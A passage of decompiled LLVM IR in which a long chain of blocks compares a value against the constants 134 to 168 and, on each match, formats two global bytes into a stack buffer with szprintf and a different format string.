  br i1 %v7_c6b4, label %dec_label_pc_c6bc, label %dec_label_pc_c6e4

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6b0
  %v2_c6bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6c8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c6d4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c6e0 = sext i8 %v3_c6c8 to i32
  %v6_c6e0 = sext i8 %v3_c6d4 to i32
  %v8_c6e0 = call i32 @szprintf(i32 %v2_c6bc, i32 ptrtoint ([14 x i8]* @global_var_20558.326 to i32), i32 %v4_c6e0, i32 %v6_c6e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c6b0, %dec_label_pc_c6bc
  %v7_c6e8 = icmp eq i32 %v2_a93c, 134
  br i1 %v7_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c718

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e4
  %v2_c6f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6fc = load i8, i8* @global_var_2c601.66, align 1
  %v3_c708 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c714 = sext i8 %v3_c6fc to i32
  %v6_c714 = sext i8 %v3_c708 to i32
  %v8_c714 = call i32 @szprintf(i32 %v2_c6f0, i32 ptrtoint ([14 x i8]* @global_var_20568.328 to i32), i32 %v4_c714, i32 %v6_c714, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c718

dec_label_pc_c718:                                ; preds = %dec_label_pc_c6e4, %dec_label_pc_c6f0
  %v7_c71c = icmp eq i32 %v2_a93c, 135
  br i1 %v7_c71c, label %dec_label_pc_c724, label %dec_label_pc_c74c

dec_label_pc_c724:                                ; preds = %dec_label_pc_c718
  %v2_c724 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c730 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c73c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c748 = sext i8 %v3_c730 to i32
  %v6_c748 = sext i8 %v3_c73c to i32
  %v8_c748 = call i32 @szprintf(i32 %v2_c724, i32 ptrtoint ([14 x i8]* @global_var_20578.330 to i32), i32 %v4_c748, i32 %v6_c748, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c74c

dec_label_pc_c74c:                                ; preds = %dec_label_pc_c718, %dec_label_pc_c724
  %v7_c750 = icmp eq i32 %v2_a93c, 136
  br i1 %v7_c750, label %dec_label_pc_c758, label %dec_label_pc_c780

dec_label_pc_c758:                                ; preds = %dec_label_pc_c74c
  %v2_c758 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c764 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c770 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c77c = sext i8 %v3_c764 to i32
  %v6_c77c = sext i8 %v3_c770 to i32
  %v8_c77c = call i32 @szprintf(i32 %v2_c758, i32 ptrtoint ([14 x i8]* @global_var_20588.332 to i32), i32 %v4_c77c, i32 %v6_c77c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c74c, %dec_label_pc_c758
  %v7_c784 = icmp eq i32 %v2_a93c, 137
  br i1 %v7_c784, label %dec_label_pc_c78c, label %dec_label_pc_c7b4

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c780
  %v2_c78c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c798 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c7a4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c7b0 = sext i8 %v3_c798 to i32
  %v6_c7b0 = sext i8 %v3_c7a4 to i32
  %v8_c7b0 = call i32 @szprintf(i32 %v2_c78c, i32 ptrtoint ([13 x i8]* @global_var_20598.334 to i32), i32 %v4_c7b0, i32 %v6_c7b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c78c
  %v7_c7b8 = icmp eq i32 %v2_a93c, 138
  br i1 %v7_c7b8, label %dec_label_pc_c7c0, label %dec_label_pc_c7e8

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c7b4
  %v2_c7c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7cc = load i8, i8* @global_var_2c601.66, align 1
  %v3_c7d8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c7e4 = sext i8 %v3_c7cc to i32
  %v6_c7e4 = sext i8 %v3_c7d8 to i32
  %v8_c7e4 = call i32 @szprintf(i32 %v2_c7c0, i32 ptrtoint ([13 x i8]* @global_var_205a8.336 to i32), i32 %v4_c7e4, i32 %v6_c7e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7e8

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7b4, %dec_label_pc_c7c0
  %v7_c7ec = icmp eq i32 %v2_a93c, 139
  br i1 %v7_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c81c

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e8
  %v2_c7f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c800 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c80c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c818 = sext i8 %v3_c800 to i32
  %v6_c818 = sext i8 %v3_c80c to i32
  %v8_c818 = call i32 @szprintf(i32 %v2_c7f4, i32 ptrtoint ([13 x i8]* @global_var_205b8.338 to i32), i32 %v4_c818, i32 %v6_c818, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c81c

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c7f4
  %v7_c820 = icmp eq i32 %v2_a93c, 140
  br i1 %v7_c820, label %dec_label_pc_c828, label %dec_label_pc_c850

dec_label_pc_c828:                                ; preds = %dec_label_pc_c81c
  %v2_c828 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c834 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c840 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c84c = sext i8 %v3_c834 to i32
  %v6_c84c = sext i8 %v3_c840 to i32
  %v8_c84c = call i32 @szprintf(i32 %v2_c828, i32 ptrtoint ([13 x i8]* @global_var_205c8.340 to i32), i32 %v4_c84c, i32 %v6_c84c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c850

dec_label_pc_c850:                                ; preds = %dec_label_pc_c81c, %dec_label_pc_c828
  %v7_c854 = icmp eq i32 %v2_a93c, 141
  br i1 %v7_c854, label %dec_label_pc_c85c, label %dec_label_pc_c884

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c850
  %v2_c85c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c868 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c874 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c880 = sext i8 %v3_c868 to i32
  %v6_c880 = sext i8 %v3_c874 to i32
  %v8_c880 = call i32 @szprintf(i32 %v2_c85c, i32 ptrtoint ([13 x i8]* @global_var_205d8.342 to i32), i32 %v4_c880, i32 %v6_c880, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c884

dec_label_pc_c884:                                ; preds = %dec_label_pc_c850, %dec_label_pc_c85c
  %v7_c888 = icmp eq i32 %v2_a93c, 142
  br i1 %v7_c888, label %dec_label_pc_c890, label %dec_label_pc_c8b8

dec_label_pc_c890:                                ; preds = %dec_label_pc_c884
  %v2_c890 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c89c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c8a8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c8b4 = sext i8 %v3_c89c to i32
  %v6_c8b4 = sext i8 %v3_c8a8 to i32
  %v8_c8b4 = call i32 @szprintf(i32 %v2_c890, i32 ptrtoint ([13 x i8]* @global_var_205e8.344 to i32), i32 %v4_c8b4, i32 %v6_c8b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8b8

dec_label_pc_c8b8:                                ; preds = %dec_label_pc_c884, %dec_label_pc_c890
  %v7_c8bc = icmp eq i32 %v2_a93c, 143
  br i1 %v7_c8bc, label %dec_label_pc_c8c4, label %dec_label_pc_c8ec

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c8b8
  %v2_c8c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8d0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c8dc = load i8, i8* @global_var_2c602.67, align 1
  %v4_c8e8 = sext i8 %v3_c8d0 to i32
  %v6_c8e8 = sext i8 %v3_c8dc to i32
  %v8_c8e8 = call i32 @szprintf(i32 %v2_c8c4, i32 ptrtoint ([14 x i8]* @global_var_204d8.310 to i32), i32 %v4_c8e8, i32 %v6_c8e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8ec

dec_label_pc_c8ec:                                ; preds = %dec_label_pc_c8b8, %dec_label_pc_c8c4
  %v7_c8f0 = icmp eq i32 %v2_a93c, 144
  br i1 %v7_c8f0, label %dec_label_pc_c8f8, label %dec_label_pc_c920

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8ec
  %v2_c8f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c904 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c910 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c91c = sext i8 %v3_c904 to i32
  %v6_c91c = sext i8 %v3_c910 to i32
  %v8_c91c = call i32 @szprintf(i32 %v2_c8f8, i32 ptrtoint ([14 x i8]* @global_var_205f8.346 to i32), i32 %v4_c91c, i32 %v6_c91c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c920

dec_label_pc_c920:                                ; preds = %dec_label_pc_c8ec, %dec_label_pc_c8f8
  %v7_c924 = icmp eq i32 %v2_a93c, 145
  br i1 %v7_c924, label %dec_label_pc_c92c, label %dec_label_pc_c954

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c920
  %v2_c92c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c938 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c944 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c950 = sext i8 %v3_c938 to i32
  %v6_c950 = sext i8 %v3_c944 to i32
  %v8_c950 = call i32 @szprintf(i32 %v2_c92c, i32 ptrtoint ([14 x i8]* @global_var_20608.348 to i32), i32 %v4_c950, i32 %v6_c950, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c92c
  %v7_c958 = icmp eq i32 %v2_a93c, 146
  br i1 %v7_c958, label %dec_label_pc_c960, label %dec_label_pc_c988

dec_label_pc_c960:                                ; preds = %dec_label_pc_c954
  %v2_c960 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c96c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c978 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c984 = sext i8 %v3_c96c to i32
  %v6_c984 = sext i8 %v3_c978 to i32
  %v8_c984 = call i32 @szprintf(i32 %v2_c960, i32 ptrtoint ([14 x i8]* @global_var_20618.350 to i32), i32 %v4_c984, i32 %v6_c984, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c988

dec_label_pc_c988:                                ; preds = %dec_label_pc_c954, %dec_label_pc_c960
  %v7_c98c = icmp eq i32 %v2_a93c, 147
  br i1 %v7_c98c, label %dec_label_pc_c994, label %dec_label_pc_c9bc

dec_label_pc_c994:                                ; preds = %dec_label_pc_c988
  %v2_c994 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9a0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c9ac = load i8, i8* @global_var_2c602.67, align 1
  %v4_c9b8 = sext i8 %v3_c9a0 to i32
  %v6_c9b8 = sext i8 %v3_c9ac to i32
  %v8_c9b8 = call i32 @szprintf(i32 %v2_c994, i32 ptrtoint ([13 x i8]* @global_var_20628.352 to i32), i32 %v4_c9b8, i32 %v6_c9b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9bc

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c988, %dec_label_pc_c994
  %v7_c9c0 = icmp eq i32 %v2_a93c, 148
  br i1 %v7_c9c0, label %dec_label_pc_c9c8, label %dec_label_pc_c9f0

dec_label_pc_c9c8:                                ; preds = %dec_label_pc_c9bc
  %v2_c9c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9d4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c9e0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c9ec = sext i8 %v3_c9d4 to i32
  %v6_c9ec = sext i8 %v3_c9e0 to i32
  %v8_c9ec = call i32 @szprintf(i32 %v2_c9c8, i32 ptrtoint ([13 x i8]* @global_var_20638.354 to i32), i32 %v4_c9ec, i32 %v6_c9ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9f0

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9bc, %dec_label_pc_c9c8
  %v7_c9f4 = icmp eq i32 %v2_a93c, 149
  br i1 %v7_c9f4, label %dec_label_pc_c9fc, label %dec_label_pc_ca24

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9f0
  %v2_c9fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca08 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ca14 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ca20 = sext i8 %v3_ca08 to i32
  %v6_ca20 = sext i8 %v3_ca14 to i32
  %v8_ca20 = call i32 @szprintf(i32 %v2_c9fc, i32 ptrtoint ([14 x i8]* @global_var_20648.357 to i32), i32 %v4_ca20, i32 %v6_ca20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca24

dec_label_pc_ca24:                                ; preds = %dec_label_pc_c9f0, %dec_label_pc_c9fc
  %v7_ca28 = icmp eq i32 %v2_a93c, 150
  br i1 %v7_ca28, label %dec_label_pc_ca30, label %dec_label_pc_ca58

dec_label_pc_ca30:                                ; preds = %dec_label_pc_ca24
  %v2_ca30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca3c = load i8, i8* @global_var_2c601.66, align 1
  %v3_ca48 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ca54 = sext i8 %v3_ca3c to i32
  %v6_ca54 = sext i8 %v3_ca48 to i32
  %v8_ca54 = call i32 @szprintf(i32 %v2_ca30, i32 ptrtoint ([14 x i8]* @global_var_20658.359 to i32), i32 %v4_ca54, i32 %v6_ca54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca24, %dec_label_pc_ca30
  %v7_ca5c = icmp eq i32 %v2_a93c, 151
  br i1 %v7_ca5c, label %dec_label_pc_ca64, label %dec_label_pc_ca8c

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca58
  %v2_ca64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca70 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ca7c = load i8, i8* @global_var_2c602.67, align 1
  %v4_ca88 = sext i8 %v3_ca70 to i32
  %v6_ca88 = sext i8 %v3_ca7c to i32
  %v8_ca88 = call i32 @szprintf(i32 %v2_ca64, i32 ptrtoint ([14 x i8]* @global_var_20668.361 to i32), i32 %v4_ca88, i32 %v6_ca88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca8c

dec_label_pc_ca8c:                                ; preds = %dec_label_pc_ca58, %dec_label_pc_ca64
  %v7_ca90 = icmp eq i32 %v2_a93c, 152
  br i1 %v7_ca90, label %dec_label_pc_ca98, label %dec_label_pc_cac0

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca8c
  %v2_ca98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_caa4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cab0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cabc = sext i8 %v3_caa4 to i32
  %v6_cabc = sext i8 %v3_cab0 to i32
  %v8_cabc = call i32 @szprintf(i32 %v2_ca98, i32 ptrtoint ([14 x i8]* @global_var_2044c.292 to i32), i32 %v4_cabc, i32 %v6_cabc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca8c, %dec_label_pc_ca98
  %v7_cac4 = icmp eq i32 %v2_a93c, 153
  br i1 %v7_cac4, label %dec_label_pc_cacc, label %dec_label_pc_caf4

dec_label_pc_cacc:                                ; preds = %dec_label_pc_cac0
  %v2_cacc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cad8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cae4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_caf0 = sext i8 %v3_cad8 to i32
  %v6_caf0 = sext i8 %v3_cae4 to i32
  %v8_caf0 = call i32 @szprintf(i32 %v2_cacc, i32 ptrtoint ([13 x i8]* @global_var_20678.364 to i32), i32 %v4_caf0, i32 %v6_caf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cac0, %dec_label_pc_cacc
  %v7_caf8 = icmp eq i32 %v2_a93c, 154
  br i1 %v7_caf8, label %dec_label_pc_cb00, label %dec_label_pc_cb28

dec_label_pc_cb00:                                ; preds = %dec_label_pc_caf4
  %v2_cb00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb0c = load i8, i8* @global_var_2c601.66, align 1
  %v3_cb18 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cb24 = sext i8 %v3_cb0c to i32
  %v6_cb24 = sext i8 %v3_cb18 to i32
  %v8_cb24 = call i32 @szprintf(i32 %v2_cb00, i32 ptrtoint ([13 x i8]* @global_var_20688.366 to i32), i32 %v4_cb24, i32 %v6_cb24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb28

dec_label_pc_cb28:                                ; preds = %dec_label_pc_caf4, %dec_label_pc_cb00
  %v7_cb2c = icmp eq i32 %v2_a93c, 155
  br i1 %v7_cb2c, label %dec_label_pc_cb34, label %dec_label_pc_cb5c

dec_label_pc_cb34:                                ; preds = %dec_label_pc_cb28
  %v2_cb34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb40 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cb4c = load i8, i8* @global_var_2c602.67, align 1
  %v4_cb58 = sext i8 %v3_cb40 to i32
  %v6_cb58 = sext i8 %v3_cb4c to i32
  %v8_cb58 = call i32 @szprintf(i32 %v2_cb34, i32 ptrtoint ([13 x i8]* @global_var_20698.368 to i32), i32 %v4_cb58, i32 %v6_cb58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb28, %dec_label_pc_cb34
  %v7_cb60 = icmp eq i32 %v2_a93c, 156
  br i1 %v7_cb60, label %dec_label_pc_cb68, label %dec_label_pc_cb90

dec_label_pc_cb68:                                ; preds = %dec_label_pc_cb5c
  %v2_cb68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb74 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cb80 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cb8c = sext i8 %v3_cb74 to i32
  %v6_cb8c = sext i8 %v3_cb80 to i32
  %v8_cb8c = call i32 @szprintf(i32 %v2_cb68, i32 ptrtoint ([13 x i8]* @global_var_206a8.370 to i32), i32 %v4_cb8c, i32 %v6_cb8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb5c, %dec_label_pc_cb68
  %v7_cb94 = icmp eq i32 %v2_a93c, 157
  br i1 %v7_cb94, label %dec_label_pc_cb9c, label %dec_label_pc_cbc4

dec_label_pc_cb9c:                                ; preds = %dec_label_pc_cb90
  %v2_cb9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cba8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cbb4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cbc0 = sext i8 %v3_cba8 to i32
  %v6_cbc0 = sext i8 %v3_cbb4 to i32
  %v8_cbc0 = call i32 @szprintf(i32 %v2_cb9c, i32 ptrtoint ([13 x i8]* @global_var_206b8.372 to i32), i32 %v4_cbc0, i32 %v6_cbc0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cb90, %dec_label_pc_cb9c
  %v7_cbc8 = icmp eq i32 %v2_a93c, 158
  br i1 %v7_cbc8, label %dec_label_pc_cbd0, label %dec_label_pc_cbf8

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cbc4
  %v2_cbd0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbdc = load i8, i8* @global_var_2c601.66, align 1
  %v3_cbe8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cbf4 = sext i8 %v3_cbdc to i32
  %v6_cbf4 = sext i8 %v3_cbe8 to i32
  %v8_cbf4 = call i32 @szprintf(i32 %v2_cbd0, i32 ptrtoint ([12 x i8]* @global_var_206c8.374 to i32), i32 %v4_cbf4, i32 %v6_cbf4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbc4, %dec_label_pc_cbd0
  %v7_cbfc = icmp eq i32 %v2_a93c, 159
  br i1 %v7_cbfc, label %dec_label_pc_cc04, label %dec_label_pc_cc2c

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbf8
  %v2_cc04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc10 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cc1c = load i8, i8* @global_var_2c602.67, align 1
  %v4_cc28 = sext i8 %v3_cc10 to i32
  %v6_cc28 = sext i8 %v3_cc1c to i32
  %v8_cc28 = call i32 @szprintf(i32 %v2_cc04, i32 ptrtoint ([14 x i8]* @global_var_206d4.376 to i32), i32 %v4_cc28, i32 %v6_cc28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc2c

dec_label_pc_cc2c:                                ; preds = %dec_label_pc_cbf8, %dec_label_pc_cc04
  %v7_cc30 = icmp eq i32 %v2_a93c, 160
  br i1 %v7_cc30, label %dec_label_pc_cc38, label %dec_label_pc_cc60

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc2c
  %v2_cc38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc44 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cc50 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cc5c = sext i8 %v3_cc44 to i32
  %v6_cc5c = sext i8 %v3_cc50 to i32
  %v8_cc5c = call i32 @szprintf(i32 %v2_cc38, i32 ptrtoint ([13 x i8]* @global_var_206e4.378 to i32), i32 %v4_cc5c, i32 %v6_cc5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cc2c, %dec_label_pc_cc38
  %v7_cc64 = icmp eq i32 %v2_a93c, 161
  br i1 %v7_cc64, label %dec_label_pc_cc6c, label %dec_label_pc_cc94

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc60
  %v2_cc6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc78 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cc84 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cc90 = sext i8 %v3_cc78 to i32
  %v6_cc90 = sext i8 %v3_cc84 to i32
  %v8_cc90 = call i32 @szprintf(i32 %v2_cc6c, i32 ptrtoint ([14 x i8]* @global_var_206f4.380 to i32), i32 %v4_cc90, i32 %v6_cc90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_cc6c
  %v7_cc98 = icmp eq i32 %v2_a93c, 162
  br i1 %v7_cc98, label %dec_label_pc_cca0, label %dec_label_pc_ccc8

dec_label_pc_cca0:                                ; preds = %dec_label_pc_cc94
  %v2_cca0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ccac = load i8, i8* @global_var_2c601.66, align 1
  %v3_ccb8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ccc4 = sext i8 %v3_ccac to i32
  %v6_ccc4 = sext i8 %v3_ccb8 to i32
  %v8_ccc4 = call i32 @szprintf(i32 %v2_cca0, i32 ptrtoint ([14 x i8]* @global_var_20704.382 to i32), i32 %v4_ccc4, i32 %v6_ccc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccc8

dec_label_pc_ccc8:                                ; preds = %dec_label_pc_cc94, %dec_label_pc_cca0
  %v7_cccc = icmp eq i32 %v2_a93c, 163
  br i1 %v7_cccc, label %dec_label_pc_ccd4, label %dec_label_pc_ccfc

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_ccc8
  %v2_ccd4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cce0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ccec = load i8, i8* @global_var_2c602.67, align 1
  %v4_ccf8 = sext i8 %v3_cce0 to i32
  %v6_ccf8 = sext i8 %v3_ccec to i32
  %v8_ccf8 = call i32 @szprintf(i32 %v2_ccd4, i32 ptrtoint ([14 x i8]* @global_var_20714.384 to i32), i32 %v4_ccf8, i32 %v6_ccf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccfc

dec_label_pc_ccfc:                                ; preds = %dec_label_pc_ccc8, %dec_label_pc_ccd4
  %v7_cd00 = icmp eq i32 %v2_a93c, 164
  br i1 %v7_cd00, label %dec_label_pc_cd08, label %dec_label_pc_cd30

dec_label_pc_cd08:                                ; preds = %dec_label_pc_ccfc
  %v2_cd08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd14 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cd20 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cd2c = sext i8 %v3_cd14 to i32
  %v6_cd2c = sext i8 %v3_cd20 to i32
  %v8_cd2c = call i32 @szprintf(i32 %v2_cd08, i32 ptrtoint ([14 x i8]* @global_var_20668.361 to i32), i32 %v4_cd2c, i32 %v6_cd2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd30

dec_label_pc_cd30:                                ; preds = %dec_label_pc_ccfc, %dec_label_pc_cd08
  %v7_cd34 = icmp eq i32 %v2_a93c, 165
  br i1 %v7_cd34, label %dec_label_pc_cd3c, label %dec_label_pc_cd64

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd30
  %v2_cd3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd48 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cd54 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cd60 = sext i8 %v3_cd48 to i32
  %v6_cd60 = sext i8 %v3_cd54 to i32
  %v8_cd60 = call i32 @szprintf(i32 %v2_cd3c, i32 ptrtoint ([13 x i8]* @global_var_20724.386 to i32), i32 %v4_cd60, i32 %v6_cd60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd64

dec_label_pc_cd64:                                ; preds = %dec_label_pc_cd30, %dec_label_pc_cd3c
  %v7_cd68 = icmp eq i32 %v2_a93c, 166
  br i1 %v7_cd68, label %dec_label_pc_cd70, label %dec_label_pc_cd98

dec_label_pc_cd70:                                ; preds = %dec_label_pc_cd64
  %v2_cd70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd7c = load i8, i8* @global_var_2c601.66, align 1
  %v3_cd88 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cd94 = sext i8 %v3_cd7c to i32
  %v6_cd94 = sext i8 %v3_cd88 to i32
  %v8_cd94 = call i32 @szprintf(i32 %v2_cd70, i32 ptrtoint ([14 x i8]* @global_var_20734.388 to i32), i32 %v4_cd94, i32 %v6_cd94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd98

dec_label_pc_cd98:                                ; preds = %dec_label_pc_cd64, %dec_label_pc_cd70
  %v7_cd9c = icmp eq i32 %v2_a93c, 167
  br i1 %v7_cd9c, label %dec_label_pc_cda4, label %dec_label_pc_cdcc

dec_label_pc_cda4:                                ; preds = %dec_label_pc_cd98
  %v2_cda4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdb0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cdbc = load i8, i8* @global_var_2c602.67, align 1
  %v4_cdc8 = sext i8 %v3_cdb0 to i32
  %v6_cdc8 = sext i8 %v3_cdbc to i32
  %v8_cdc8 = call i32 @szprintf(i32 %v2_cda4, i32 ptrtoint ([14 x i8]* @global_var_206d4.376 to i32), i32 %v4_cdc8, i32 %v6_cdc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cd98, %dec_label_pc_cda4
  %v7_cdd0 = icmp eq i32 %v2_a93c, 168
  br i1 %v7_cdd0, label %dec_label_pc_cdd8, label %dec_label_pc_ce00

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdcc
  %v2_cdd8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cde4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cdf0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cdfc = sext i8 %v3_cde4 to i32
  %v6_cdfc = sext i8 %v3_cdf0 to i32
